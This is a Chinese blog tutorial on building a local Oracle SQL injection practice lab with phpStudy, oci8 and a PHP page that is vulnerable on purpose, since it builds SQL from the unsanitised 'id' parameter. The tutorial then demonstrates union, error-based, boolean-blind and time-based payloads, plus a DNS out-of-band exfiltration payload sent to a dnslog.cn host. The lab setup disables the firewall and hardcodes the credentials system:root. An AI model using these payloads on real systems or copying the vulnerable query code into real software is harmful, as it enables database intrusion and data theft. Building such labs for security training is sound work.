---
title: Oracle数据库注入环境搭建
tags: 
  - 数据库
  - sql注入
  - oracle数据库
  - 环境搭建
categories: 环境搭建
keywords: 'oracle数据库,环境搭建,sql注入'
description: Oracle数据库注入环境搭建
cover: https://img0.baidu.com/it/u=3845303080,3279446310&fm=26&fmt=auto&gp=0.jpg
date: 2021-08-01 10:00:00
---

<meta name="referrer" content="no-referrer"/>

# 0x01 安装Oracle数据库

1、首先下载数据库安装软件
具体可以从参考这里，我是从他的百度云下载的
[https://blog.csdn.net/qq_32786873/article/details/81187208](https://blog.csdn.net/qq_32786873/article/details/81187208)
2、点击setup.exe安装即可
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627458559268-9d095175-6720-4b4b-9165-7cb60a3e855e.png#align=left&display=inline&height=252&margin=%5Bobject%2Object%5D&name=image.png&originHeight=504&originWidth=1570&size=61039&status=done&style=none&width=785)
（安装过程不过多阐述，没什么太大区别，就下一步下一步即可）

3、开启oracle数据库


打开cmd，连接数据库
```
C:\Users\user>sqlplus
请输入用户名:  system
输入口令:
连接到:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
防止网络不通，建议关闭防火墙
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627453482798-3baff679-3b19-4f3c-a8c5-26dfa3fae74b.png#align=left&display=inline&height=401&margin=%5Bobject%2Object%5D&name=image.png&originHeight=802&originWidth=1310&size=91870&status=done&style=none&width=655)
4、使用navicat连接数据库（system:root）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532220399-c06a2dc3-d502-4ac9-80bc-967625b716af.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=924&size=39243&status=done&style=none&width=462)
5、也可以使用sql plus新建用户
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539624468-51a70f51-77bb-41a8-b3e6-598cd7784f7c.png#align=left&display=inline&height=623&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1246&originWidth=532&size=300224&status=done&style=none&width=266)
# 0x02 安装phpstudy
1、phpstudy下载地址如下：
[http://public.xp.cn/upgrades/phpStudy20161103.zip](http://public.xp.cn/upgrades/phpStudy20161103.zip)
这里推荐使用2016版本，因为我使用2018死活搭不成功
安装过程很简单，设置安装路径，下一步下一步即可。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532525123-7fe22127-8c82-43e8-a3fc-3b90bdcb9888.png#align=left&display=inline&height=448&margin=%5Bobject%2Object%5D&name=image.png&originHeight=896&originWidth=1216&size=57968&status=done&style=none&width=608)
2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532565418-c2f0a01f-ea23-4f42-aa37-4e4f223c25e9.png#align=left&display=inline&height=386&margin=%5Bobject%2Object%5D&name=image.png&originHeight=772&originWidth=1294&size=391925&status=done&style=none&width=647)
（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：[https://www.php.cn/xiazai/download/1481](https://www.php.cn/xiazai/download/1481)）
3、安装完之后，打开phpinfo
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532770453-b48b361b-6115-40e8-a802-86b3415379eb.png#align=left&display=inline&height=518&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1036&originWidth=1314&size=485815&status=done&style=none&width=657)
也可以像我这样在C:\phpStudy\WWW目录下新建phpinfo.php文件，内容为：
```php
<?php phpinfo();?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532747143-dc367dc0-4a13-4e24-bbc7-7bd518e2e334.png#align=left&display=inline&height=364&margin=%5Bobject%2Object%5D&name=image.png&originHeight=728&originWidth=1360&size=164284&status=done&style=none&width=680)
这里看到是32位的。
# 0x03 设置oci8扩展
（这里我是死活不成功，弄了半天）
1、首先在C:\phpStudy\php\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532987042-08f559fe-42a9-4dc3-a3c1-a1a88232b380.png#align=left&display=inline&height=476&margin=%5Bobject%2Object%5D&name=image.png&originHeight=952&originWidth=2644&size=213841&status=done&style=none&width=1322)
2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：
[https://www.it1352.com/1713162.html](https://www.it1352.com/1713162.html)
在php路径下，打开cmd，输入如下命令：
```php
C:\phpStudy\php\php-5.5.38>php.exe -m
PHP Warning:  PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_oci8.dll' - %1 不是有效的 Win32 应用程序。
 in Unknown on line 0

Warning: PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_oci8.dll' - %1 不是有效的 Win32 应用程序。
 in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_oci8_11g.dll' - %1 不是有 效的 Win32 应用程序。
 in Unknown on line 0

Warning: PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_oci8_11g.dll' - %1 不是有效的 Win32 应用程序。
 in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。
 in Unknown on line 0

Warning: PHP Startup: Unable to load dynamic library 'C:\phpStudy\php\php-5.5.38\ext\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。
 in Unknown on line 0
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537664336-d0f1cbff-e217-415e-9c3f-c6afea1e1fff.png#align=left&display=inline&height=520&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1040&originWidth=1950&size=176001&status=done&style=none&width=975)
3、根据文章中所说，安装**oracle instantclient**，链接如下：
[https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html](https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html)
因为数据库是11g的，所以安装11.1.x版本
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537791843-1b689f65-de26-4d29-b36f-e8269d9c9f08.png#align=left&display=inline&height=521&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1042&originWidth=2708&size=209242&status=done&style=none&width=1354)
4、下载好之后解压，放入C:\instantclient_11_1
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537838346-438837f0-196f-46f5-8263-80481facf640.png#align=left&display=inline&height=453&margin=%5Bobject%2Object%5D&name=image.png&originHeight=906&originWidth=1606&size=161187&status=done&style=none&width=803)
5、设置环境变量，这一步很重要
在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537919273-db8cc709-d63f-4f9b-8e73-3bb5f8e5ec67.png#align=left&display=inline&height=647&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1294&originWidth=2468&size=515243&status=done&style=none&width=1234)
增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538045153-7b63740e-1dbf-4c66-bb39-3bd4c7092ff7.png#align=left&display=inline&height=511&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1022&originWidth=1046&size=77568&status=done&style=none&width=523)
6、验证，在cmd命令提示符中输入
```php
where oci*
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539303726-33a0ea0d-eb8f-4dbe-a896-e17bcb58e6e5.png#align=left&display=inline&height=188&margin=%5Bobject%2Object%5D&name=image.png&originHeight=376&originWidth=1084&size=59269&status=done&style=none&width=542)
出现instantclient的路径即可。
7、重启计算机
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538340688-e470a2bb-38ed-4f82-88cb-9c554e1e534d.png#align=left&display=inline&height=355&margin=%5Bobject%2Object%5D&name=image.png&originHeight=710&originWidth=974&size=18334&status=done&style=none&width=487)
8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可）
```php
php.exe --ri oci8
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539378014-1dd2ed2a-e160-456c-95e8-8454296e760d.png#align=left&display=inline&height=481&margin=%5Bobject%2Object%5D&name=image.png&originHeight=962&originWidth=1340&size=113244&status=done&style=none&width=670)
9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539512949-f85db2c3-85b5-4da6-a1c4-3ad15f45dc16.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1580&size=78200&status=done&style=none&width=790)
当出现如下界面，环境就已经基本搭建好了。
# 0x04 创建漏洞测试环境
## 1、 建立存在漏洞数据
1、首先使用navicat连接数据库
（这里有一个坑，连接时可能会出现oracle library is not loaded）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539961158-a91d2a49-c1a1-402d-a3a8-3b8a5cbb8620.png#align=left&display=inline&height=397&margin=%5Bobject%2Object%5D&name=image.png&originHeight=794&originWidth=1872&size=67558&status=done&style=none&width=936)
在工具 - 选项处
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539811909-3ea4f232-baa8-491d-8de3-08a44e87ac54.png#align=left&display=inline&height=282&margin=%5Bobject%2Object%5D&name=image.png&originHeight=564&originWidth=1320&size=68308&status=done&style=none&width=660)
修改oci环境，选择之前数据库安装的路径，修改完后记得重启
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540060849-0839d8a1-10c0-4b49-ba35-cd70e3a7c14b.png#align=left&display=inline&height=597&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1194&originWidth=1536&size=79187&status=done&style=none&width=768)
2、连接数据库之后，选择相应的用户，我这里是SYSTEM
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540125339-60483bd9-5527-46c5-9fc2-b2394ddd0722.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=946&size=30183&status=done&style=none&width=473)
3、新建表TEST，设置如下字段
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540264141-c9cb7b96-558b-4cef-b015-5c25e97bd8d7.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1628&size=58227&status=done&style=none&width=814)
4、添加如下数据（数据其实是任意的，随意添加即可）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540925893-509b0585-e42c-437f-a8cf-6d178dd23d4b.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&name=image.png&originHeight=470&originWidth=1358&size=43179&status=done&style=none&width=679)
5、新建查询进行验证
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540945678-0b57f457-592c-4efd-aa13-a5ca5033ea8f.png#align=left&display=inline&height=457&margin=%5Bobject%2Object%5D&name=image.png&originHeight=914&originWidth=1530&size=59045&status=done&style=none&width=765)
以上漏洞数据就简单搭建成功了。
## 2、搭建PHP站点
1、将源码保存为oracle.php文件，放到C:\phpStudy\WWW目录下
源码如下：
```php
<?php
  header("Content-Type:text/html;charset=utf-8");
  $id = @$_GET['id'];
  $dbstr ="(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))"; //连接数据库的参数配置 
  $conn = oci_connect('system','root',$dbstr);//连接数据库，前两个参数分别是账号和密码
  if (!$conn)
  {
    $Error = oci_error();//错误信息
    print htmlentities($Error['message']);
    exit;
  }
  else
  {
    echo "<h3>Oracle 注入测试靶场</h3>"."<br>";
    $sql = "select * from TEST where id=".$id;//sql查询语句
	  echo "当前sql语句为：".$sql."<br>"."<br>";//输出sql查询语句
    $ora_b = oci_parse($conn,$sql);  //编译sql语句 
    oci_execute($ora_b,OCI_DEFAULT);  //执行 
    while($r=oci_fetch_row($ora_b))  //取回结果 
    { 
      $i=0;
      echo "Id:".$r[$i++]."  </t> <br>";
      echo "Name:".$r[$i++]."  </t><br>  ";
      echo "Age:".$r[$i++]."  </t><br>  ";
    }
  }
  oci_close($conn);//关闭连接
?>
```
2、访问[http://localhost/oracle.php?id=1](http://localhost/oracle.php?id=1)，返回如下界面表示搭建成功，数据库也成功连接了。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541521049-4e04787c-15b8-4686-a485-d5d2e03e9f3f.png#align=left&display=inline&height=340&margin=%5Bobject%2Object%5D&name=image.png&originHeight=680&originWidth=1342&size=55565&status=done&style=none&width=671)
# 0x05 Oracle注入测试
## 1、检测漏洞点
```php
http://localhost/oracle.php?id=1 and 1=1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541538885-aab0d8c4-aafa-4511-897d-ab85f13130e2.png#align=left&display=inline&height=261&margin=%5Bobject%2Object%5D&name=image.png&originHeight=522&originWidth=1176&size=46725&status=done&style=none&width=588)
```php
http://localhost/oracle.php?id=1 and 1=2
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541558550-37db5cd6-20ef-4b68-a731-38eca533e8fb.png#align=left&display=inline&height=222&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=1072&size=38860&status=done&style=none&width=536)
## 2、显错注入
```php
http://localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,'4' from dual --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541979564-ea8c20f1-051d-4998-ae63-8cc4c6caf50e.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1874&size=73845&status=done&style=none&width=937)
## 3、报错注入
```php
http://localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542108099-2a4e87d2-214a-4809-9762-24e01b40471b.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2068&size=150069&status=done&style=none&width=1034)
## 4、布尔盲注
```php
http://localhost/oracle.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542211017-7bbd5646-d87a-496e-abef-d67b929449ac.png#align=left&display=inline&height=348&margin=%5Bobject%2Object%5D&name=image.png&originHeight=696&originWidth=1774&size=76159&status=done&style=none&width=887)
```php
http://localhost/oracle.php?id=1 and 1=(select decode(user,'SSSSS',1,0) from dual) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542229391-54e9c196-437c-464a-a1ee-565b21ccee2b.png#align=left&display=inline&height=174&margin=%5Bobject%2Object%5D&name=image.png&originHeight=574&originWidth=1752&size=66181&status=done&style=none&width=532)
## 5、延时盲注
```php
http://localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542453679-5c200dec-7af1-485d-91a1-5230c4724937.png#align=left&display=inline&height=424&margin=%5Bobject%2Object%5D&name=image.png&originHeight=848&originWidth=2060&size=180765&status=done&style=none&width=1030)
## 6、外带数据
```php
http://localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.pgx519.dnslog.cn') from dual)is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542575557-283cc745-e90e-4d49-a82d-4d9aa836531d.png#align=left&display=inline&height=295&margin=%5Bobject%2Object%5D&name=image.png&originHeight=590&originWidth=2062&size=88703&status=done&style=none&width=1031)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542587192-62e5df2a-2158-4204-8430-3f154aa27d6f.png#align=left&display=inline&height=402&margin=%5Bobject%2Object%5D&name=image.png&originHeight=804&originWidth=1650&size=109880&status=done&style=none&width=825)
# 0x06 总结
Oracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。
之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～
